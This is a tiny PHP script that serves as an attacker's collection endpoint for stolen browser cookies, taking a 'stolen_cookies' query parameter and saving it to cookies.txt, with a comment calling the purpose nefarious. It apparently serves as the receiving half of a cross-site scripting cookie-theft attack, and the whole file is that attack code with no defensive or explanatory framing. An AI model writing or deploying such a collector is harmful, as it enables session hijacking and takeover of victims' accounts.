<?php
if (isset($_GET['stolen_cookies'])) {
    // Do something nefarious with the stolen cookies
    file_put_contents('cookies.txt', $_GET['stolen_cookies']);
}
?>
